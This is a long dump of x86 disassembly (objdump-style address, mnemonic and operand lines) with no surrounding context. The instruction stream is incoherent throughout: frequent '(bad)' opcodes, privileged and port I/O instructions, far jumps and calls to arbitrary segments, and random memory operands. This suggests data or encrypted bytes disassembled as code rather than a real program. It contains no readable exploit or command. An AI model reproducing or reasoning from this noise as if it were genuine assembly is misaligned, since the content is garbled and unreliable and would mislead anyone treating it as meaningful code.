  405b2e:	jmp    0xe411798a
  405b33:	pop    ecx
  405b34:	jle    0x405b6d
  405b36:	mov    ds:0xde55047f,eax
  405b3b:	push   edi
  405b3c:	cdq    
  405b3d:	push   esi
  405b3e:	cwde   
  405b3f:	(bad)  
  405b40:	daa    
  405b41:	jae    0x405b30
  405b43:	not    BYTE PTR [ebp+0x1c]
  405b46:	stc    
  405b47:	and    ah,dh
  405b49:	loopne 0x405b33
  405b4b:	xor    eax,ecx
  405b4d:	sbb    eax,DWORD PTR [ebp-0x30]
  405b50:	test   eax,ebx
  405b52:	jge    0x405ba9
  405b54:	jl     0x405b1a
  405b56:	mov    dl,0x69
  405b58:	in     al,0x53
  405b5a:	popa   
  405b5b:	adc    bl,BYTE PTR [edx]
  405b5d:	dec    edx
  405b5e:	mov    ds:0xc0fcbb34,al
  405b63:	push   esp
  405b64:	xor    DWORD PTR [edx+0x66],ecx
  405b67:	pushf  
  405b68:	cmp    ch,BYTE PTR [edx]
  405b6a:	push   eax
  405b6b:	xchg   esi,eax
  405b6c:	sbb    cl,cl
  405b6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b6f:	dec    eax
  405b70:	or     bl,BYTE PTR [edi-0x3]
  405b73:	fstp   DWORD PTR [ebx-0x16]
  405b76:	cmp    al,BYTE PTR [edi]
  405b78:	pop    ss
  405b79:	test   dh,ch
  405b7b:	xchg   ebp,esp
  405b7d:	fcom   DWORD PTR [edx+0x2f99ac45]
  405b83:	sar    edx,cl
  405b85:	push   0x1f837ea
  405b8a:	les    ecx,FWORD PTR [ebx]
  405b8c:	and    al,0x33
  405b8e:	sbb    BYTE PTR [ecx-0x63c34499],al
  405b94:	push   esp
  405b95:	push   ds
  405b96:	jp     0x405b95
  405b98:	aaa    
  405b99:	fwait
  405b9a:	jbe    0x405b70
  405b9c:	shl    BYTE PTR [ebx+0x66e3ab7d],cl
  405ba2:	mov    ecx,DWORD PTR [ecx-0x435b9db6]
  405ba8:	pusha  
  405ba9:	cdq    
  405baa:	xchg   ecx,eax
  405bab:	push   eax
  405bac:	xchg   ebp,eax
  405bad:	ins    DWORD PTR es:[edi],dx
  405bae:	jp     0x405bc8
  405bb0:	xor    edi,DWORD PTR [edi+0x61]
  405bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bb4:	cmp    eax,0x3684f92c
  405bb9:	xchg   al,ch
  405bbb:	inc    eax
  405bbc:	adc    eax,0xdc5389c1
  405bc1:	pop    ecx
  405bc2:	sub    esi,DWORD PTR [ebp-0x1e]
  405bc5:	jns    0x405bde
  405bc7:	sub    BYTE PTR [ebp-0x22348f68],bl
  405bcd:	outs   dx,BYTE PTR ds:[esi]
  405bce:	push   cs
  405bcf:	mov    bh,0x7d
  405bd1:	cmp    eax,0xe58f0c15
  405bd6:	dec    esi
  405bd7:	imul   esp,DWORD PTR [edx-0xc],0x72985043
  405bde:	cmp    al,0xc4
  405be0:	(bad)  
  405be1:	cmp    dl,BYTE PTR [edx-0x1]
  405be4:	xor    al,0x87
  405be6:	(bad)  
  405be7:	mov    ah,0xc1
  405be9:	retf   0xefe8
  405bec:	scas   eax,DWORD PTR es:[edi]
  405bed:	cmp    DWORD PTR [eax+esi*4-0x5c],0x65959542
  405bf5:	(bad)  
  405bf7:	addr16 imul edx,ecx,0x60c76a35
  405bfe:	xchg   ecx,eax
  405bff:	fcom   DWORD PTR [esi+esi*1]
  405c02:	inc    eax
  405c03:	push   edx
  405c04:	sub    esp,DWORD PTR [eax]
  405c06:	sub    eax,DWORD PTR gs:[ecx+edi*4]
  405c0a:	inc    edx
  405c0b:	addr16 mov esp,0x31bac0c8
  405c11:	inc    ecx
  405c12:	lods   eax,DWORD PTR ds:[esi]
  405c13:	adc    edx,DWORD PTR ds:0xe0bd2792
  405c19:	inc    esi
  405c1a:	lods   al,BYTE PTR ds:[esi]
  405c1b:	xor    DWORD PTR [ebp-0x13],eax
  405c1e:	push   esi
  405c1f:	dec    ecx
  405c20:	mov    ch,0x96
  405c22:	(bad)  
  405c23:	into   
  405c24:	mov    edx,ebx
  405c26:	jb     0x405bd6
  405c28:	sbb    dh,BYTE PTR [ebp+0x33]
  405c2b:	call   0xd821d4d6
  405c30:	cwde   
  405c31:	add    edx,DWORD PTR [di]
  405c34:	pop    ebx
  405c35:	adc    BYTE PTR [eax-0x249a8d30],ch
  405c3b:	push   ecx
  405c3c:	adc    edx,DWORD PTR [ebp-0x34]
  405c3f:	cs fwait
  405c41:	(bad)  
  405c42:	iret   
  405c43:	and    DWORD PTR [ebp+0x2c],esi
  405c46:	lods   al,BYTE PTR ds:[esi]
  405c47:	mov    ebx,ss
  405c49:	pop    es
  405c4a:	mov    ch,0x2b
  405c4c:	add    ch,BYTE PTR [edi]
  405c4e:	sub    dh,BYTE PTR [edx+0x7649cb3c]
  405c54:	mov    edx,0x2a3d0a50
  405c59:	adc    eax,0x6887b8d2
  405c5e:	adc    al,0xe7
  405c60:	lahf   
  405c61:	or     DWORD PTR [eax+ebp*8],0x36
  405c65:	(bad)  
  405c66:	neg    DWORD PTR ds:0xf73ffbfd
  405c6c:	call   0x1c43:0x2a21ff59
  405c73:	ss jo  0x405cda
  405c76:	stos   DWORD PTR es:[edi],eax
  405c77:	xchg   ebp,eax
  405c78:	mov    fs,edx
  405c7a:	jns    0x405c69
  405c7c:	pushw  0xffe7
  405c7f:	or     BYTE PTR [eax-0x3e],0x62
  405c83:	xor    BYTE PTR [eax-0x62c2af1a],al
  405c89:	fwait
  405c8a:	shr    BYTE PTR [ecx+0x0],1
  405c8d:	dec    edx
  405c8e:	add    dl,BYTE PTR [esi]
  405c90:	call   0x3a1adbe
  405c95:	inc    eax
  405c96:	push   ss
  405c97:	lds    edi,FWORD PTR [esi]
  405c99:	jae    0x405cfc
  405c9b:	mov    ecx,DWORD PTR [esi+0x65b32f09]
  405ca1:	outs   dx,DWORD PTR ds:[esi]
  405ca2:	sar    BYTE PTR [esi-0x145ff4c],1
  405ca8:	lock mov al,0x64
  405cab:	daa    
  405cac:	mov    ch,0x0
  405cae:	mov    al,0xe
  405cb0:	dec    esp
  405cb1:	jbe    0x405c88
  405cb3:	rol    DWORD PTR ds:0x6060769f,0x16
  405cba:	inc    eax
  405cbb:	or     BYTE PTR [eax+0x2a],ah
  405cbe:	mov    DWORD PTR [eax+0x51],edi
  405cc1:	(bad)  
  405cc3:	dec    eax
  405cc4:	sbb    eax,DWORD PTR [ebp-0x4f]
  405cc7:	pop    ss
  405cc8:	cmp    DWORD PTR [ebp+0x7],esi
  405ccb:	ror    DWORD PTR ds:0xdbcf8c45,cl
  405cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cd2:	arpl   ax,cx
  405cd4:	add    al,0xfa
  405cd6:	pop    edx
  405cd7:	push   ebp
  405cd8:	add    BYTE PTR [ebx+0x5c968b8e],dl
  405cde:	jmp    DWORD PTR [edx-0x5a]
  405ce1:	or     ecx,esp
  405ce3:	push   0xffffffc3
  405ce5:	xor    DWORD PTR [edx-0xf],edx
  405ce8:	and    edi,DWORD PTR [ebx+0x3ea73999]
  405cee:	jg     0x405ce7
  405cf0:	cdq    
  405cf1:	std    
  405cf2:	dec    eax
  405cf3:	fs gs int 0x1
  405cf7:	int    0xb0
  405cf9:	xor    ebp,DWORD PTR [ebx]
  405cfb:	mov    cl,0x56
  405cfe:	sahf   
  405cff:	mov    dl,0xcd
  405d01:	adc    al,BYTE PTR [edx-0x80]
  405d04:	aad    0xb5
  405d06:	leave  
  405d07:	imul   esi,DWORD PTR [ecx],0xb5df3010
  405d0d:	cmc    
  405d0e:	cld    
  405d0f:	int    0x89
  405d11:	dec    ebp
  405d12:	aaa    
  405d13:	xchg   edi,eax
  405d14:	das    
  405d15:	cmp    eax,esp
  405d17:	sub    eax,0xe3bcc751
  405d1c:	ret    
  405d1d:	retf   
  405d1e:	sub    ebp,DWORD PTR [ebx+0x209f4b3]
  405d24:	sub    eax,0xf33c46a1
  405d29:	fadd   st(1),st
  405d2b:	enter  0x7091,0xfc
  405d2f:	lods   al,BYTE PTR ds:[esi]
  405d30:	jo     0x405d5a
  405d32:	shr    DWORD PTR [ecx-0x4abc31f1],cl
  405d38:	mov    ebx,0x7f007711
  405d3d:	xchg   esi,eax
  405d3e:	jne    0x405d8c
  405d40:	inc    eax
  405d41:	cdq    
  405d42:	jb     0x405d16
  405d44:	cmp    al,BYTE PTR [edi]
  405d46:	rdpmc  
  405d48:	dec    esp
  405d49:	ret    0x5895
  405d4c:	jno    0x405cd2
  405d4e:	sahf   
  405d4f:	ds (bad) 
  405d51:	pop    ebp
  405d52:	popa   
  405d53:	out    dx,al
  405d54:	cmp    dh,BYTE PTR [ebp-0x49]
  405d57:	(bad)  
  405d58:	mov    ebp,0x52df0cdc
  405d5d:	push   esp
  405d5e:	xchg   ecx,eax
  405d5f:	pusha  
  405d60:	or     edi,DWORD PTR [eax]
  405d62:	add    al,0x1e
  405d64:	inc    edx
  405d65:	mov    ah,0x8b
  405d67:	xor    eax,0x53655d64
  405d6c:	dec    esp
  405d6d:	xchg   ebp,eax
  405d6e:	cli    
  405d6f:	jmp    0x30df:0x83130709
  405d76:	add    ecx,DWORD PTR [edi]
  405d78:	pop    esi
  405d79:	pop    esi
  405d7a:	call   0x40048d4
  405d7f:	bnd jae 0x405d71
  405d82:	stc    
  405d83:	add    bh,BYTE PTR [si-0x25cf]
  405d88:	add    al,0xa
  405d8a:	xchg   ecx,eax
  405d8b:	popa   
  405d8c:	mov    al,ds:0x182cbeee
  405d91:	push   es
  405d92:	pushw  0xcab
  405d96:	add    ch,ch
  405d98:	aaa    
  405d99:	cmp    BYTE PTR [edx-0x4f449020],dl
  405d9f:	inc    ebx
  405da0:	add    bl,BYTE PTR [ebp-0x17]
  405da3:	(bad)  
  405da4:	sbb    ebp,DWORD PTR [esp+edx*4]
  405da7:	cli    
  405da8:	iret   
  405da9:	mov    edx,0x2d4b45ee
  405dae:	add    DWORD PTR [edx+0x21bce1ac],0xaf965803
  405db8:	ret    0x7258
  405dbb:	push   ebx
  405dbc:	or     DWORD PTR [esp+esi*4],esi
  405dbf:	fcom   QWORD PTR [esi+ebx*8+0x650a712]
  405dc6:	push   esp
  405dc7:	fisttp DWORD PTR [ecx+0x2c0912ae]
  405dcd:	jmp    0x405dc0
  405dcf:	adc    dh,BYTE PTR [edx-0x42b10340]
  405dd5:	mov    bl,0x47
  405dd7:	pop    es
  405dd8:	push   ebx
  405dd9:	cld    
  405dda:	xor    ch,BYTE PTR [ecx-0x67]
  405ddd:	sbb    bl,ch
  405ddf:	shl    BYTE PTR [edx-0x36c0030c],cl
  405de5:	push   ss
  405de6:	or     dh,BYTE PTR [eax+0x53]
  405de9:	adc    dl,BYTE PTR [ebx-0x1b]
  405dec:	scas   eax,DWORD PTR es:[edi]
  405ded:	mov    ch,0x46
  405def:	sar    DWORD PTR [ecx+0x5c],1
  405df2:	and    dh,BYTE PTR [edx-0x69fd38dc]
  405df8:	std    
  405df9:	pop    edi
  405dfa:	outs   dx,BYTE PTR ds:[esi]
  405dfb:	mov    esp,0xf50f3870
  405e00:	in     al,0x12
  405e02:	adc    bl,0xc5
  405e05:	mov    ch,BYTE PTR [ebp+0x45]
  405e08:	or     ah,dl
  405e0a:	push   edi
  405e0b:	adc    BYTE PTR [ebx],cl
  405e0d:	es push cs
  405e0f:	clc    
  405e10:	mov    DWORD PTR [ecx],ebp
  405e12:	xchg   edi,eax
  405e13:	and    eax,DWORD PTR [edx]
  405e15:	call   0x732:0xb7f1ae85
  405e1c:	dec    esp
  405e1d:	leave  
  405e1e:	sbb    eax,0x544d95a5
  405e23:	fild   DWORD PTR [ebp-0x7a22d6a3]
  405e29:	mov    bh,0xd3
  405e2b:	shl    BYTE PTR [edi-0x5b],cl
  405e2e:	shr    DWORD PTR [esi+ebp*2],cl
  405e31:	sbb    al,ch
  405e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e34:	push   esi
  405e35:	jae    0x405e06
  405e37:	(bad)  
  405e38:	js     0x405de0
  405e3a:	pushf  
  405e3b:	cli    
  405e3c:	loope  0x405e84
  405e3e:	stc    
  405e3f:	sub    BYTE PTR [edx],dl
  405e41:	sbb    al,0x50
  405e43:	mov    esi,esp
  405e45:	xchg   esp,eax
  405e46:	pop    ds
  405e47:	stos   DWORD PTR es:[edi],eax
  405e48:	int3   
  405e49:	aad    0xc6
  405e4b:	into   
  405e4c:	and    eax,0x4eacaa01
  405e51:	call   0xd55bcacb
  405e56:	and    BYTE PTR [eax],dl
  405e58:	arpl   WORD PTR [ebx],bp
  405e5a:	cmp    DWORD PTR [ebp-0x436ded45],edi
  405e60:	mov    eax,0xda616cc8
  405e65:	jmp    0x2f05:0xffbc3521
  405e6c:	call   0xcf9d:0xe6384b91
  405e73:	rcr    esi,1
  405e75:	jmp    0x94c5:0x8e6550d3
  405e7c:	dec    edx
  405e7d:	cmp    al,0xe5
  405e7f:	popa   
  405e80:	js     0x405e7a
  405e82:	sar    DWORD PTR ds:0xb385d086,1
  405e88:	dec    esi
  405e89:	(bad)  
  405e8a:	mov    ds:0xeffe848b,eax
  405e8f:	or     DWORD PTR [edx+0xaff699],edx
  405e95:	loope  0x405e5a
  405e97:	fidivr DWORD PTR cs:[ecx+0x55]
  405e9b:	pop    esp
  405e9c:	add    bh,BYTE PTR [ebx-0x4f]
  405e9f:	add    esi,DWORD PTR [ebp-0x4]
  405ea2:	popa   
  405ea3:	dec    edi
  405ea4:	ss iret 
  405ea6:	clc    
  405ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ea8:	test   ax,0x380a
  405eac:	int3   
  405ead:	dec    ecx
  405eae:	jle    0x405ee6
  405eb0:	xchg   ebx,eax
  405eb1:	push   esp
  405eb2:	mov    ds:0x1e5cf596,eax
  405eb7:	aaa    
  405eb8:	(bad)  
  405eb9:	xor    BYTE PTR ds:0x122c8e96,dh
  405ebf:	and    edx,DWORD PTR ds:0x2c704a18
  405ec5:	mov    ebx,0x2772ceea
  405eca:	and    al,BYTE PTR [edx+0x2c2d297]
  405ed0:	scas   al,BYTE PTR es:[edi]
  405ed1:	in     eax,0x3c
  405ed3:	jno    0x405f2a
  405ed5:	cmp    dh,ch
  405ed7:	jecxz  0x405f06
  405ed9:	lahf   
  405eda:	cmp    al,0x70
  405edc:	jno    0x405e63
  405ede:	ror    DWORD PTR [esi],0xa8
  405ee1:	inc    ecx
  405ee2:	sbb    al,BYTE PTR [edx+edx*1]
  405ee5:	inc    esp
  405ee6:	lods   eax,DWORD PTR ds:[esi]
  405ee7:	jns    0x405ed6
  405ee9:	lahf   
  405eea:	popa   
  405eeb:	test   eax,0xb93e7474
  405ef0:	cmp    al,0x2a
  405ef2:	(bad)  
  405ef3:	xor    DWORD PTR [eax+eax*2+0x4a],eax
  405ef7:	ror    BYTE PTR ds:0x3f991c42,0x76
  405efe:	or     BYTE PTR [esi-0x2d],al
  405f01:	mov    cl,0xe3
  405f03:	mov    dl,0x6
  405f05:	adc    eax,0x321c14a7
  405f0a:	inc    esi
  405f0b:	push   ds
  405f0c:	pop    esi
  405f0d:	div    BYTE PTR [edx-0x6dc63b0c]
  405f13:	add    dh,ah
  405f15:	lock push 0xfffffff0
  405f18:	fst    st(3)
  405f1a:	sub    al,0xf3
  405f1c:	je     0x405f31
  405f1e:	adc    al,0xa4
  405f20:	dec    ecx
  405f21:	rcl    DWORD PTR [edi],cl
  405f23:	adc    DWORD PTR [ebp-0x3f81ba25],ebx
  405f29:	into   
  405f2a:	adc    ecx,ecx
  405f2c:	call   esp
  405f2e:	dec    ebp
  405f2f:	mov    dh,0x9c
  405f31:	daa    
  405f32:	sbb    DWORD PTR [edi+0x44],edi
  405f35:	inc    ebx
  405f36:	add    ah,BYTE PTR ss:[edi-0x316c3ecd]
  405f3d:	dec    edx
  405f3e:	dec    ecx
  405f3f:	mov    al,ds:0x9c3a7f4a
  405f44:	std    
  405f45:	(bad)  
  405f46:	dec    edi
  405f47:	inc    edx
  405f48:	inc    edx
  405f49:	arpl   sp,cx
  405f4b:	xor    ebp,DWORD PTR [eax]
  405f4d:	push   ds
  405f4e:	fs mov dl,0xc2
  405f51:	cmp    eax,0x1f475fd8
  405f56:	sub    BYTE PTR [esi],ch
  405f58:	cmp    esp,ebp
  405f5a:	ret    
  405f5b:	ja     0x405f30
  405f5d:	add    eax,0x6d4996e5
  405f62:	cmp    eax,0x334969e4
  405f67:	out    0xb,al
  405f69:	std    
  405f6a:	jnp    0x405f5c
  405f6c:	repz fisttp WORD PTR [esi]
  405f6f:	sub    edi,DWORD PTR [eax-0x71]
  405f72:	out    dx,al
  405f73:	add    eax,edi
  405f75:	dec    esi
  405f76:	jg     0x405fe0
  405f78:	xor    al,0xd3
  405f7a:	inc    edi
  405f7b:	and    al,0x89
  405f7d:	jle    0x405f35
  405f7f:	cmp    esp,ecx
  405f81:	mov    ebx,0x36ba3242
  405f86:	and    al,0xf0
  405f88:	sahf   
  405f89:	fdiv   QWORD PTR [ebp+0x43]
  405f8c:	lods   eax,DWORD PTR ds:[esi]
  405f8d:	(bad)
  405f91:	pop    edx
  405f92:	ins    DWORD PTR es:[edi],dx
  405f93:	add    eax,0x15ae9d09
  405f98:	ins    BYTE PTR es:[edi],dx
  405f99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f9a:	and    eax,edx
  405f9c:	(bad)  [edi]
  405f9e:	inc    esi
  405f9f:	mov    ch,0xd
  405fa1:	cmp    BYTE PTR [ecx],cl
  405fa3:	cmp    eax,0xced389ab
  405fa8:	dec    edi
  405fa9:	pop    ebx
  405faa:	out    0xf0,eax
  405fac:	in     al,0xf4
  405fae:	outs   dx,BYTE PTR ds:[esi]
  405faf:	pushf  
  405fb0:	aam    0x76
  405fb2:	jl     0x405f4b
  405fb4:	loopne 0x405fe8
  405fb6:	mov    al,ds:0x6feeb7da
  405fbb:	sub    BYTE PTR [edx],bl
  405fbd:	xor    BYTE PTR [edi+eiz*1-0x11],0x54
  405fc2:	bound  esi,QWORD PTR [esi-0x66]
  405fc5:	inc    eax
  405fc7:	push   eax
  405fc8:	imul   edi,esp,0xaec5847b
  405fce:	test   DWORD PTR [ecx+0x7580bb92],ebp
  405fd4:	int    0xe2
  405fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fd7:	xor    dh,BYTE PTR [eax]
  405fd9:	push   es
  405fda:	shl    ch,1
  405fdc:	mov    BYTE PTR [edx],bl
  405fde:	imul   eax
  405fe0:	in     al,dx
  405fe1:	cmc    
  405fe2:	fwait
  405fe3:	pop    eax
  405fe4:	mov    dl,BYTE PTR [esi]
  405fe6:	mov    ebx,0xcf1adbed
  405feb:	(bad)  
  405fec:	mov    edi,0x1f2f61e1
  405ff1:	fild   WORD PTR [esi-0x75]
  405ff4:	pop    es
  405ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ff6:	fcmovne st,st(7)
  405ff8:	xchg   edx,eax
  405ff9:	xchg   edi,eax
  405ffa:	mov    ds:0x35c59140,eax
  405fff:	in     al,dx
  406000:	and    eax,0x7d1675cd
  406005:	push   edx
  406006:	iret   
  406007:	pop    esp
  406008:	addr16 mov al,0x45
  40600b:	jbe    0x40605e
  40600d:	sbb    al,BYTE PTR [ebp-0x7a]
  406010:	(bad)  
  406011:	jo     0x406003
  406013:	pop    es
  406014:	repz xor BYTE PTR [edi-0x73293c3c],bl
  40601b:	out    dx,eax
  40601c:	pop    ecx
  40601d:	mov    dl,0x49
  40601f:	add    eax,0xe8c69541
  406024:	jge    0x40607d
  406026:	ins    DWORD PTR es:[edi],dx
  406027:	fnstsw WORD PTR [eax+0x1cee2f3c]
  40602d:	mov    eax,ds:0xe7dad4dd
  406032:	lods   eax,DWORD PTR ds:[esi]
  406033:	pop    es
  406034:	popa   
  406035:	lock push 0x681792b4
  40603b:	dec    edx
  40603c:	jmp    0x405ff3
  40603e:	loop   0x40604e
  406040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406041:	cwde   
  406042:	cwde   
  406043:	aad    0xc2
  406045:	fdiv   QWORD PTR [edi]
  406047:	mov    cl,0xdf
  406049:	lea    ebp,[ebp+esi*4+0x7a51e4ef]
  406050:	iret   
  406051:	add    DWORD PTR [ebp+0x4b30998a],ebp
  406057:	nop
  406058:	leave  
  406059:	cmp    DWORD PTR [ecx-0x3c],edx
  40605c:	mov    cl,0x54
  40605e:	mov    eax,0x4a5d2399
  406063:	gs std 
  406065:	cmp    eax,0xb9490f04
  40606a:	ss cmp esp,DWORD PTR cs:[edx+ebp*8+0x704a4657]
  406073:	(bad)  
  406075:	cmp    al,0x29
  406077:	pusha  
  406078:	push   edx
  406079:	add    ebx,eax
  40607b:	in     eax,0x48
  40607d:	inc    esi
  40607e:	dec    eax
  40607f:	hlt    
  406080:	cdq    
  406081:	retf   0x1aee
  406084:	pop    ecx
  406086:	jg     0x4060c9
  406088:	lea    ebp,[esi]
  40608a:	es mov ch,0xb7
  40608d:	and    dl,dl
  40608f:	js     0x406020
  406091:	dec    ecx
  406092:	std    
  406093:	repz add eax,0xe766f0d3
  406099:	inc    esp
  40609a:	cmp    eax,0x1de2db5a
  40609f:	(bad)  
  4060a0:	call   0xf9802113
  4060a5:	fst    QWORD PTR [ebp+0x32]
  4060a8:	retf   0x52c1
  4060ab:	shl    DWORD PTR [edi+0x10],0xe5
  4060af:	nop
  4060b0:	mov    eax,ds:0x84cb5f04
  4060b5:	mov    edx,0x9dfcdf39
  4060ba:	pop    ss
  4060bb:	xchg   edx,eax
  4060bc:	mov    eax,ds:0x51a52e00
  4060c1:	or     DWORD PTR [eax+0x1e101a42],eax
  4060c7:	inc    ebp
  4060c8:	addr16 popa 
  4060ca:	cdq    
  4060cb:	cld    
  4060cc:	mov    eax,0x14d8c1be
  4060d1:	xchg   DWORD PTR [esp+ecx*8],ebx
  4060d4:	(bad)  
  4060d5:	fadd   st(7),st
  4060d7:	mov    esi,ebx
  4060d9:	les    esi,FWORD PTR [ecx+0x2e]
  4060dc:	cmp    BYTE PTR [edi-0x49],al
  4060df:	arpl   ax,cx
  4060e1:	outs   dx,BYTE PTR ds:[esi]
  4060e2:	cmp    DWORD PTR [edx+0x4e532523],0x86d3197d
  4060ec:	into   
  4060ed:	or     BYTE PTR [eax-0x7b],0xc
  4060f1:	dec    esi
  4060f2:	neg    BYTE PTR [edi]
  4060f4:	and    BYTE PTR cs:[ecx+0x39],0x79
  4060f9:	repnz ror ebx,1
  4060fc:	fs add ebx,0x52
  406100:	(bad)  
  406103:	and    DWORD PTR [ecx+edi*1],eax
  406106:	les    edx,FWORD PTR [eax]
  406108:	mov    BYTE PTR [eax-0x5e502202],dl
  40610e:	cmp    eax,0xb67ef4e6
  406113:	enter  0xf902,0xa9
  406117:	sbb    BYTE PTR [edi+0x56492ebe],0x2e
  40611e:	mov    DWORD PTR ds:0xa86e81d9,eax
  406124:	jle    0x40616e
  406126:	xor    dh,al
  406128:	leave  
  406129:	bound  esi,QWORD PTR [esi+ebp*8+0x3c]
  40612d:	dec    ebp
  40612e:	and    DWORD PTR [eax+0x65],ebx
  406131:	xchg   ebp,eax
  406132:	imul   ebx,DWORD PTR [ecx-0x5c],0xffffffe2
  406136:	xor    ebp,edi
  406138:	test   al,0xf8
  40613a:	(bad)  
  40613b:	cmp    BYTE PTR [esi+ecx*1],ah
  40613e:	rcl    cl,cl
  406140:	aam    0xb1
  406142:	out    0x4b,al
  406144:	jle    0x40610f
  406146:	in     eax,0xaa
  406148:	xor    BYTE PTR ds:0x45698505,bh
  40614e:	(bad)  
  40614f:	xchg   ebx,eax
  406150:	cmp    al,0xb1
  406152:	sub    cl,cl
  406154:	jp     0x4060f0
  406156:	fadd   QWORD PTR [ebp-0x38c61eb5]
  40615c:	fmul   DWORD PTR [ebp+0x42ec1087]
  406162:	pop    esi
  406163:	je     0x4061c9
  406165:	jmp    0x10bd383f
  40616a:	dec    ebx
  40616b:	inc    esi
  40616c:	add    BYTE PTR [ecx+ebx*4+0x21],bh
  406170:	pop    ds
  406171:	stos   BYTE PTR es:[edi],al
  406172:	or     BYTE PTR [ebp+0x66],al
  406175:	mov    bh,BYTE PTR [edx]
  406177:	addr16 and eax,0xe727502c
  40617d:	pop    ebp
  40617e:	cld    
  40617f:	mov    BYTE PTR [ecx+0x45],cl
  406182:	dec    ecx
  406183:	push   edx
  406184:	nop
  406185:	in     al,0xe9
  406187:	lods   al,BYTE PTR ds:[esi]
  406188:	mov    cl,0xd
  40618a:	mov    cl,0x84
  40618c:	sbb    al,dl
  40618e:	repz mov eax,0x674b6a1
  406194:	jbe    0x406156
  406196:	adc    cl,dh
  406198:	dec    esi
  406199:	dec    BYTE PTR [edi+0x3c5bf158]
  40619f:	pushf  
  4061a0:	(bad)  
  4061a1:	sbb    ebx,DWORD PTR [eax-0x20]
  4061a4:	cmp    dh,dl
  4061a6:	bound  ebp,QWORD PTR [ebx-0x25]
  4061a9:	fstp   TBYTE PTR [esi-0x37]
  4061ac:	into   
  4061ad:	adc    BYTE PTR [esi+edx*1+0x2a],bh
  4061b1:	fldenv [edi-0x4755ec99]
  4061b7:	jge    0x40622a
  4061b9:	jle    0x406153
  4061bb:	xchg   BYTE PTR [ecx+0x72],bl
  4061be:	adc    al,0xd7
  4061c0:	mov    al,0x32
  4061c2:	sahf   
  4061c3:	jle    0x4061ef
  4061c5:	xor    eax,0x21ec12ec
  4061ca:	outs   dx,BYTE PTR ds:[esi]
  4061cb:	stc    
  4061cc:	adc    al,al
  4061ce:	xor    eax,0x1a76a925
  4061d3:	int    0xad
  4061d5:	sub    DWORD PTR [edi+0x7055af37],0xffffffff
  4061dc:	ins    DWORD PTR es:[edi],dx
  4061dd:	or     eax,esi
  4061df:	daa    
  4061e0:	stc    
  4061e1:	cmp    eax,0x8d564ec5
  4061e6:	sbb    al,0x32
  4061e8:	cmp    BYTE PTR [esi-0x19],ah
  4061eb:	xchg   esi,eax
  4061ec:	xchg   DWORD PTR [eax],edx
  4061ee:	adc    edx,edx
  4061f0:	sbb    BYTE PTR [esi],0xb9
  4061f3:	icebp  
  4061f4:	jns    0x4061b9
  4061f6:	sbb    al,0x32
  4061f8:	mov    esi,0x901a286b
  4061fd:	add    DWORD PTR [edx-0x76],ebp
  406200:	push   ebx
  406201:	push   ebx
  406202:	xlat   BYTE PTR ds:[ebx]
  406203:	adc    bh,bh
  406205:	jge    0x40618e
  406207:	mov    al,0x37
  406209:	mov    ecx,DWORD PTR ds:0x218dbddd
  40620f:	ja     0x4061b9
  406211:	xchg   ebp,eax
  406212:	fsubr  QWORD PTR [edi+0xf]
  406215:	cwde   
  406216:	and    eax,esi
  406218:	jmp    0x59929258
  40621d:	rcl    DWORD PTR [edx],0x3e
  406220:	and    eax,0xf9cb4d8c
  406225:	test   al,0x18
  406227:	push   esi
  406228:	inc    eax
  406229:	xor    ebp,DWORD PTR [ecx]
  40622b:	xchg   ebp,eax
  40622c:	jl     0x4061b1
  40622e:	add    bl,BYTE PTR es:[edx+edx*2+0x497b1195]
  406236:	jl     0x4062a0
  406238:	mov    cl,0x4a
  40623a:	repnz dec ebx
  40623c:	daa    
  40623d:	std    
  40623e:	sti    
  40623f:	or     DWORD PTR [eax-0x73],0xffffffd1
  406243:	loopne 0x4061dd
  406245:	fdivr  st(3),st
  406247:	mov    eax,0x21d5c411
  40624c:	push   ebp
  40624d:	out    dx,al
  40624e:	xchg   esp,eax
  40624f:	fnsave [esi-0x468e7a37]
  406255:	loop   0x406258
  406257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406258:	bnd jo 0x406226
  40625b:	pop    ebp
  40625c:	jmp    0x769a:0x60b6e68
  406263:	popa   
  406264:	xchg   BYTE PTR es:[esi+eiz*1],bh
  406268:	add    eax,0xa65724e0
  40626d:	lds    ecx,FWORD PTR [edi+eax*1+0x4c]
  406271:	dec    ebx
  406272:	xor    ebx,DWORD PTR [edx+eax*8+0x1]
  406276:	pop    DWORD PTR [eax+0x77]
  406279:	xchg   ebp,eax
  40627a:	fisub  DWORD PTR [ebx+0x5cfc71fc]
  406280:	xor    ch,BYTE PTR [esi]
  406282:	dec    edi
  406283:	aas    
  406284:	push   esp
  406285:	cmovne ebx,DWORD PTR [esi-0x7]
  406289:	inc    esi
  40628a:	xchg   BYTE PTR [eax+ecx*4-0x6],cl
  40628e:	nop
  40628f:	and    eax,DWORD PTR [esi+0x4f]
  406292:	call   0x4197:0xace9ef8b
  406299:	pop    ebp
  40629a:	ins    BYTE PTR es:[edi],dx
  40629b:	leave  
  40629c:	pop    ss
  40629d:	loopne 0x4062a8
  40629f:	xchg   ecx,eax
  4062a0:	push   es
  4062a1:	call   0xaaa5a714
  4062a6:	hlt    
  4062a7:	or     dh,BYTE PTR [edx+0x38928f2c]
  4062ad:	imul   edx,esp,0xae63f5bd
  4062b3:	icebp  
  4062b4:	pop    ecx
  4062b5:	or     DWORD PTR [esp+eax*8+0x5d],edx
  4062b9:	mov    WORD PTR [ebx+0x5cc85c4d],?
  4062bf:	add    BYTE PTR [edx+0x1bb1c6c0],bh
  4062c5:	pop    ebx
  4062c6:	stos   BYTE PTR es:[edi],al
  4062c7:	adc    BYTE PTR [ebp+0x75eebf8],bl
  4062cd:	dec    esi
  4062ce:	mov    cl,0x80
  4062d0:	or     al,BYTE PTR [eax+0x1f9fb47b]
  4062d6:	pop    edi
  4062d7:	outs   dx,BYTE PTR es:[esi]
  4062d9:	(bad)  
  4062da:	mov    dl,0xc8
  4062dc:	inc    esp
  4062dd:	xchg   BYTE PTR ss:[ebx+0x7daa4535],dh
